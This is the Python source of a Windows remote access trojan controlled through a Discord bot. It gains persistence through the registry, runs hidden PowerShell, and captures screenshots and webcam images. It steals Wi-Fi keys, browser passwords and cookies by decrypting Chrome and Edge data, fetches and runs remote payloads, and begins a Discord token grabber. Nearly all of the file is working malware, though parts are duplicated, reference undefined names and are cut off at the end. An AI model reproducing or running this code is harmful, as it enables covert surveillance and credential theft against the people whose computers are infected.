import asyncio
import base64
import ctypes
import datetime
import io
import json
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import urllib.request
import winreg

from shutil import copy2
from getpass import getuser
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import psutil
from discord import Embed
import cv2
import discord
import pyaudio
import pyautogui
import requests
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from os.path import expanduser
from datetime import timedelta
from os import getenv
from discord.ext import commands, tasks
from io import BytesIO
from discord import File


intents = discord.Intents().all()

bot = commands.Bot(command_prefix='!', intents=intents)

# Feature : PUBLIC IP ADDRESS FETCH
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        public_ip = data['ip']
        return public_ip
    except:
        return 'N/A'

# Feature : CREATE CATEGORY & CHANNELS
@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user.name}')
    guild = bot.guilds[0]  # Assuming the bot is only in one guild/server

    # Check if the category and channels already exist
    category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
    if not category:
        # Create the category
        category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')

        # Create the channels
        channel_names = ['・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', '・⌨│ᴛᴇʀᴍɪɴᴀʟ', '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', '・🔑│ᴋᴇʏʟᴏɢꜱ', '・🔔│ʀᴀᴛ-ʟᴏɢꜱ']
        for name in channel_names:
            await guild.create_text_channel(name, category=category)

    # Get system information
    system_name = socket.gethostname()
    public_ip = get_public_ip()
    system_ip = socket.gethostbyname(socket.gethostname())

    # Find the channel for device logs
    device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
    if device_logs_channel:
        embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
        embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
        embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
        embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)  # Bold Text: System IP Address

        # Add Footer with bot, date, and time information
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        footer_text = f'RAT | Date: {current_time}'
        embed.set_footer(text=footer_text)

        await device_logs_channel.send(embed=embed)

# Dictionary containing command descriptions
command_descriptions = {
    "!cam_list": "Displays a list of available webcams.",
    "!camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID.",
    "!clear <count>": "Clears the specified number of messages in the current chat.",
    "!download <path>": "Downloads a file from the specified URL and saves it to the provided path.",
    "!grab_cookies": "Grabs saved cookies from the default web browser.",
    "!grab_distoken": "Grabs the Discord user token.",
    "!grab_password": "Grabs saved passwords from the default web browser.",
    "!grab_wifi": "Grabs saved WiFi passwords on the device.",
    "!help": "Shows a message containing the list of commands and their descriptions.",
    "!kill_process": "Terminates a specified process by name.",
    "!list_process": "Lists all currently running processes.",
    "!ping": "Checks if the bot is online and responsive.",
    "!powershell <cmd>": "Executes the provided PowerShell command.",
    "!bot_down": "Shuts down the bot.",
    "!screenlogger <on/off>": "Enables or disables the functionality to send screenshots every 10 seconds.",
    "!screenshot": "Takes a screenshot of the current screen.",
    "!set_payload <url>": "Automatically executes and deletes a payload from the provided URL.",
    "!sys_info": "Retrieves and displays system information.",
    "!sys_log": "Retrieves and displays system logs.",
    "!sys_restart": "Restarts the system.",
    "!sys_shutdown": "Shuts down the system."
}

@bot.command(name='bot_help')
async def bot_help(ctx):
    help_message = "**Available Commands:**\n\n"
    for command, description in command_descriptions.items():
        help_message += f"{command}: {description}\n\n"

    # Send the message inside a code block
    boxed_help_message = f"```md\n{help_message}```"
    await ctx.send(boxed_help_message)

# Feature : REGISTRY INJECTION
def remove_startup_key():
    try:
        # Open the "Run" registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

        # Delete the registry value
        winreg.DeleteValue(key, "MyStartupKey")

        # Close the registry key
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass

def add_to_startup():
    # Open the "Run" registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    
    # Get the path to the current executable
    executable_path = os.path.abspath(sys.executable)
    
    # Create a new registry value with your desired name and executable path
    winreg.SetValueEx(key, "MyStartupKey", 0, winreg.REG_SZ, executable_path)
    
    # Close the registry key
    winreg.CloseKey(key)

def run_as_admin():
    # Get the script filename
    script_filename = os.path.abspath(sys.argv[0])

    # Get the required privileges elevation parameters
    params = f'"{script_filename}"'
    shell32 = ctypes.windll.shell32
    shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

if __name__ == "__main__":
    remove_startup_key()  # Remove existing registry entry if present
    try:
        add_to_startup()
    except PermissionError:
        run_as_admin()

# Command : POWERSHELL
@bot.command()
async def powershell(ctx, *, command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window

        output = subprocess.check_output(["powershell", command], startupinfo=startupinfo, universal_newlines=True)

        if len(output) > 2000:
            with open('output.txt', 'w', encoding='utf-8') as file:
                file.write(output)

            await ctx.send(file=discord.File('output.txt'))
            os.remove('output.txt')
        else:
            await ctx.send(f'```{output}```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')

# Command : SYSTEM LOG 
@bot.command()
async def sys_log(ctx):
    try:
        fetching_time = 60  # Time in seconds to fetch system logs
        backup_count = fetching_time

        countdown_message = await ctx.send(f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        for count in range(backup_count - 1, 0, -1):
            await asyncio.sleep(1)
            backup_count = count
            await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        await asyncio.sleep(1)
        await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count - 1} seconds left```")

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window

        output = subprocess.check_output(["powershell", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"], startupinfo=startupinfo, universal_newlines=True)

        with open('syslog.txt', 'w', encoding='utf-8') as file:
            file.write(output)

        await ctx.send("System logs retrieved : ``syslog.txt``")
        await ctx.send(file=discord.File('syslog.txt'))
        os.remove('syslog.txt')

    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')

# Function : SCREENLOGGER
screenlogger_enabled = False

# Function to send keylogs and screenshots to Discord channel as an embed message
async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
    global screenlogger_enabled

    while screenlogger_enabled:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_bytes = BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        # Create the embed object
        embed = discord.Embed(title='Screenshot', color=discord.Color.blue())

        # Attach the screenshot to the embed
        file = discord.File(screenshot_bytes, filename='screenshot.png')
        embed.set_image(url='attachment://screenshot.png')

        # Send the embed message to the specified channel
        channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
        if channel:
            await channel.send(embed=embed, file=file)

        # Schedule the next execution of the coroutine after 10 seconds
        await asyncio.sleep(10)

# Command: SCREENLOGGER
@bot.command()
async def screenlogger(ctx, state):
    global screenlogger_enabled

    channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'

    if state == 'on':
        if not screenlogger_enabled:
            screenlogger_enabled = True
            asyncio.create_task(send_logs_and_screenshot(ctx))  # Pass ctx as an argument
            await ctx.send('Screenlogger is now ``Enabled 🟢``')
        else:
            await ctx.send('Screenlogger is **Already** ``Enabled 🟢``')
    elif state == 'off':
        if screenlogger_enabled:
            screenlogger_enabled = False
            await ctx.send('Screenlogger is now ``Disabled ⚫``')
        else:
            await ctx.send('Screenlogger is **Already** ``Disabled ⚫``')
    else:
        await ctx.send('Invalid state. Please use `on` or `off`.')

# Command: SET PAYLOAD
@bot.command()
async def set_payload(ctx, url: str):
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        max_retry_attempts = 3
        retry_delay = 2

        for attempt in range(1, max_retry_attempts + 1):
            try:
                response = requests.get(url, verify=False)
                response.raise_for_status()
                content = response.content
                break

            except (requests.RequestException, IOError) as e:
                await ctx.send(f'Error downloading the file: {str(e)}. Retrying in {retry_delay} seconds...')
                time.sleep(retry_delay)

                if attempt == max_retry_attempts:
                    await ctx.send('Maximum number of retry attempts reached. Unable to download the file.')
                    return

        home_dir = os.path.expanduser("~")
        downloads_folder = os.path.join(home_dir, "Downloads")
        file_path = os.path.join(downloads_folder, filename)
        
        with open(file_path, 'wb') as file:
            file.write(content)

        await ctx.send(f'File downloaded successfully to ``📁 {file_path}``')

        command = f'start-process -FilePath "{file_path}"'
        subprocess.run(['powershell.exe', '-Command', command], shell=True)

        await ctx.send('File installed and executed.')

        await asyncio.sleep(10)

        os.remove(file_path)

        await ctx.send('File deleted permanently.')

    except Exception as e:
        await ctx.send(f'Error: {str(e)}')

# Command: SCREENSHOT
@bot.command()
async def screenshot(ctx):
    # Get the directory where the script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Take a screenshot of the screen
    screenshot = pyautogui.screenshot()

    # Convert the screenshot to bytes
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes.seek(0)

    # Construct the relative path to the app icon
    app_icon_path = os.path.join(script_dir, 'Windows_Defender-Logo.wine.ico')

    # Send the screenshot as an attachment in Discord
    picture = discord.File(img_bytes, filename='spyshot.png')
    await ctx.send(file=picture)

# Command : GRAB WIFI
@bot.command()
async def grab_wifi(ctx):
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout

        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]

        wifi_passwords = []

        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            profile_output = result.stdout

            if "Key Content" in profile_output:
                password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
                wifi_passwords.append((profile, password_line[0]))

        if wifi_passwords:
            for wifi in wifi_passwords:
                await ctx.send(f'``📶 Wi-Fi Network: {wifi[0]}, 🔑 Password: {wifi[1]}``')
        else:
            await ctx.send('No saved Wi-Fi passwords found.')
    except Exception as e:
        await ctx.send(f'Error occurred while retrieving Wi-Fi passwords: {str(e)}')

# Command : PING
@bot.command()
async def ping(ctx):
    start_time = datetime.datetime.now()
    message = await ctx.send('Calculating ping...')
    end_time = datetime.datetime.now()

    latency = round((end_time - start_time).total_seconds() * 1000)

    if latency < 50:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :green_circle: Excellent'
    elif latency < 100:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :yellow_circle: Moderate'
    else:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :red_circle: Poor'

    response = response.replace(":green_circle:", "🟢")
    response = response.replace(":yellow_circle:", "🟡")
    response = response.replace(":red_circle:", "🔴")

    await message.edit(content=f'```\n{response}\n```')

    if latency >= 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency increased to: {latency}ms\n```')
    elif latency < 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency decreased to: {latency}ms\n```')

# Function : SYSTEM INFO
# Helper functions to extract specific information from systeminfo command output
def get_value_by_label(label, output):
    label = label + ":"
    lines = output.splitlines()
    for line in lines:
        if line.startswith(label):
            return line.split(label)[1].strip()
    return None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

def get_system_manufacturer(output):
    return get_value_by_label("System Manufacturer", output)

def get_system_model(output):
    return get_value_by_label("System Model", output)

def get_system_type(output):
    return get_value_by_label("System Type", output)

def get_processors(output):
    return get_value_by_label("Processor(s)", output)

def get_bios_version(output):
    return get_value_by_label("BIOS Version", output)

def get_windows_directory(output):
    return get_value_by_label("Windows Directory", output)

def get_system_directory(output):
    return get_value_by_label("System Directory", output)

def get_boot_device(output):
    return get_value_by_label("Boot Device", output)

def get_system_locale(output):
    return get_value_by_label("System Locale", output)

def get_input_locale(output):
    return get_value_by_label("Input Locale", output)

def get_time_zone(output):
    return get_value_by_label("Time Zone", output)

def get_available_physical_memory(output):
    return get_value_by_label("Available Physical Memory", output)

def get_virtual_memory_max_size(output):
    return get_value_by_label("Virtual Memory: Max Size", output)

def get_virtual_memory_available(output):
    return get_value_by_label("Virtual Memory: Available", output)

def get_virtual_memory_in_use(output):
    return get_value_by_label("Virtual Memory: In Use", output)

def get_page_file_locations(output):
    return get_value_by_label("Page File Location(s)", output)

def get_domain(output):
    return get_value_by_label("Domain", output)

def get_logon_server(output):
    return get_value_by_label("Logon Server", output)

def get_hotfixes(output):
    return get_value_by_label("Hotfix(s)", output)

def get_network_cards(output):
    return get_value_by_label("Network Card(s)", output)

def get_hyperv_requirements(output):
    return get_value_by_label("Hyper-V Requirements", output)

def get_battery_percentage(output):
    return get_value_by_label("Battery Percentage", output)

# Command : SYSTEM INFO
@bot.command()
async def sys_info(ctx):
    try:
        os_info = subprocess.run(
            'powershell.exe systeminfo', 
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
    except FileNotFoundError:
        await ctx.send("The 'systeminfo' command is not available on this system.")
        return

    os_version = get_os_version(os_info)
    os_manufacturer = get_os_manufacturer(os_info)
    os_configuration = get_os_configuration(os_info)
    os_build_type = get_os_build_type(os_info)
    registered_owner = get_registered_owner(os_info)
    registered_organization = get_registered_organization(os_info)
    product_id = get_product_id(os_info)
    original_install_date = get_original_install_date(os_info)
    system_boot_time = get_system_boot_time(os_info)
    system_manufacturer = get_system_manufacturer(os_info)
    system_model = get_system_model(os_info)
    system_type = get_system_type(os_info)
    processors = get_processors(os_info)
    bios_version = get_bios_version(os_info)
    windows_directory = get_windows_directory(os_info)
    system_directory = get_system_directory(os_info)
    boot_device = get_boot_device(os_info)
    system_locale = get_system_locale(os_info)
    input_locale = get_input_locale(os_info)
    time_zone = get_time_zone(os_info)
    available_physical_memory = get_available_physical_memory(os_info)
    virtual_memory_max_size = get_virtual_memory_max_size(os_info)
    virtual_memory_available = get_virtual_memory_available(os_info)
    virtual_memory_in_use = get_virtual_memory_in_use(os_info)
    page_file_locations = get_page_file_locations(os_info)
    domain = get_domain(os_info)
    logon_server = get_logon_server(os_info)
    hotfixes = get_hotfixes(os_info)
    network_cards = get_network_cards(os_info)
    hyperv_requirements = get_hyperv_requirements(os_info)
    battery_percentage = get_battery_percentage(os_info)

    info_message = f"OS Version: {os_version}\n" \
                   f"OS Manufacturer: {os_manufacturer}\n" \
                   f"OS Configuration: {os_configuration}\n" \
                   f"OS Build Type: {os_build_type}\n" \
                   f"Registered Owner: {registered_owner}\n" \
                   f"Registered Organization: {registered_organization}\n" \
                   f"Product ID: {product_id}\n" \
                   f"Original Install Date: {original_install_date}\n" \
                   f"System Boot Time: {system_boot_time}\n" \
                   f"System Manufacturer: {system_manufacturer}\n" \
                   f"System Model: {system_model}\n" \
                   f"System Type: {system_type}\n" \
                   f"Processors: {processors}\n" \
                   f"BIOS Version: {bios_version}\n" \
                   f"Windows Directory: {windows_directory}\n" \
                   f"System Directory: {system_directory}\n" \
                   f"Boot Device: {boot_device}\n" \
                   f"System Locale: {system_locale}\n" \
                   f"Input Locale: {input_locale}\n" \
                   f"Time Zone: {time_zone}\n" \
                   f"Available Physical Memory: {available_physical_memory}\n" \
                   f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
                   f"Virtual Memory: Available: {virtual_memory_available}\n" \
                   f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
                   f"Page File Location(s): {page_file_locations}\n" \
                   f"Domain: {domain}\n" \
                   f"Logon Server: {logon_server}\n" \
                   f"Hotfix(s): {hotfixes}\n" \
                   f"Network Card(s): {network_cards}\n" \
                   f"Hyper-V Requirements: {hyperv_requirements}\n" \
                   f"Battery Percentage: {battery_percentage}\n"

    # Split the message into smaller parts if it exceeds the character limit
    messages = []
    while len(info_message) > 0:
        messages.append(info_message[:2000])
        info_message = info_message[2000:]

    for message in messages:
        code_block_message = f"```{message}```"  # Send As A Box
        await ctx.send(code_block_message)

# Command : DOWNLOAD
@bot.command()
async def download(ctx, source_path):
    target_channel = ctx.message.channel  # Use the current Discord channel as the target channel
    try:
        with open(source_path, 'rb') as file:
            await target_channel.send(file=discord.File(file))
        filename = os.path.basename(source_path)
        await ctx.send(f"📁 ``{filename}`` Downloaded Successfully!")
    except FileNotFoundError:
        await ctx.send("Source file not found.")

# Command : CAM LIST
@bot.command()
async def cam_list(ctx):
    # Get the list of available webcam devices
    device_list = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            _, _ = cap.read()
            device_list.append(f"Webcam {i}")
            cap.release()
        else:
            break

    # Send the list of webcam devices to Discord
    device_info = '\n'.join(device_list)
    await ctx.send(f"Available webcam devices:\n{device_info}")

# Command : CAMIC
@bot.command()
async def camic(ctx, device_id=None):
    # Check if a specific webcam device is provided
    if device_id is not None:
        try:
            device_id = int(device_id)
        except ValueError:
            await ctx.send("Invalid device ID. Please provide a valid numeric ID.")
            return
    else:
        device_id = 0  # Default to the first webcam device

    # Capture photo from the specified webcam
    cap = cv2.VideoCapture(device_id)
    if not cap.isOpened():
        await ctx.send("Failed to open the webcam device.")
        return

    ret, frame = cap.read()

    # Convert the frame to bytes
    _, buffer = cv2.imencode('.jpg', frame)
    img_bytes = buffer.tobytes()

    # Send the photo to Discord
    picture = discord.File(io.BytesIO(img_bytes), filename='webcam_photo.jpg')
    await ctx.send(file=picture)

    # Release the webcam
    cap.release()

def grab_cookies():
    browser = Browsers()
    browser.grab_cookies()


def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)    
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(f"C:\\Users\\{getuser()}\\cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"Host: {host_key}\t\nName: {name}\t\nValue: {value}\n\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

        time.sleep(3)
        with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'w'):
            pass

# Command : LIST PROCESS
@bot.command()
async def list_process(ctx):
    try:
        process_list = psutil.process_iter()
        processes = [p.name() for p in process_list]

        if processes:
            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
            process_str = ""
            for chunk in process_chunks:
                process_str += '\n'.join(chunk) + '\n'

            file = io.BytesIO(process_str.encode())
            await ctx.send(file=File(file, filename='process_list.txt'))
        else:
            await ctx.send('No process found.')

    except Exception as e:
        await ctx.send(f'Error listing process: {str(e)}')

# Command : KILL PROCESS
@bot.command()
async def kill_process(ctx, name: str):
    try:
        if sys.platform == 'win32':
            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
        else:
            process = subprocess.run(['killall', name], capture_output=True)

        if process.returncode == 0:
            await ctx.send(f'Process ``{name}`` killed.')
        else:
            error_output = process.stderr.decode().strip()
            await ctx.send(f'Error killing process: {error_output}')

    except Exception as e:
        await ctx.send(f'Error killing process: {str(e)}')

def convert_date(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - file_name) / nanoseconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')

def get_master_key():
    try:
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except: exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password_edge(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e: return "Chrome < 80"

def get_passwords_edge():
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
    try: shutil.copy2(login_db, "Loginvault.db")
    except: print("Edge browser not detected!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        result = {}
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                result[url] = [username, decrypted_password]
    except: pass

    cursor.close(); conn.close()
    try: os.remove("Loginvault.db")
    except Exception as e: print(e); pass

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    try:
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except: 
        time.sleep(1)

def decrypt_password_chrome(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try: 
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except: 
            return ""

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    file_name = "ChromeData.db"
    shutil.copyfile(db_path, file_name)
    db = sqlite3.connect(file_name)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    result = {}
    for row in cursor.fetchall():
        action_url = row[1]
        username = row[2]
        password = decrypt_password_chrome(row[3], key)
        if username or password:
            result[action_url] = [username, password]
        else: 
            continue
    cursor.close(); db.close()
    try: 
        os.remove(file_name)
    except: 
        pass
    return result

def grab_passwords():
    file_name, nanoseconds = 116444736000000000, 10000000
    try:
        result = main()
    except:
        time.sleep(1)

    try: 
        result2 = get_passwords_edge()
        for i in result2.keys():
            result[i] = result2[i]
    except:
        time.sleep(1)

    return result

# Define the grab_password command
@bot.command()
async def grab_password(ctx):
    passwords = grab_passwords()

    # Format the passwords into a nice message
    if passwords:
        message = "``Here are the saved passwords:``\n"
        for url, credentials in passwords.items():
            username = credentials[0]
            passwd = credentials[1]
            message += f"```URL: {url}\nUsername: {username}\nPassword: {passwd}\n\n```"
    else:
        message = "No passwords found!"

    await ctx.send(message)

# Command : RAT SHUTDOWN
@bot.command()
@commands.is_owner()
async def rat_down(ctx):
    await ctx.send("``🔩 Shutting down...``")
    await bot.close()

# Command : SYSTEM SHUTDOWN
@bot.command()
async def sys_shutdown(ctx):
    await ctx.send("Shutting down...")
    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)

# Command : SYSTEM RESTART
@bot.command()
async def sys_restart(ctx):
    await ctx.send("Restarting...")
    subprocess.run(["shutdown", "/r", "/t", "0"])
    
# Command : CLEAR
@bot.command()
@commands.is_owner()
async def clear(ctx, amount: int):
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"``Cleared {amount} messages 🗑️``", delete_after=3)


def grab_cookies(self):
    for name, path in self.browsers.items():
        if not os.path.isdir(path):
            continue

        self.masterkey = self.get_master_key(path + '\\Local State')
        self.funcs = [
            self.cookies
        ]

        for profile in self.profiles:
            for func in self.funcs:
                print(f"Processing browser: {name}, Profile: {profile}")
                try:
                    func(name, path, profile)
                except Exception as e:
                    print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

@bot.command()
async def grab_cookies(ctx):
    try:
        await ctx.send('Grabbing cookies...')
        browser = Browsers()
        browser.grab_cookies()
        with open(f'C:\\Users\\{getuser()}\\ready.cookies', 'r', encoding="utf-8") as f:
            cookies_data = f.read()

        await ctx.send(f'Cookies:\n```\n{cookies_data}\n```')
    except Exception as e:
        await ctx.send(f'Error occurred: {e}')

class grab_discord:
    def initialize(self):
        return fetch_tokens().upload()
      
class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
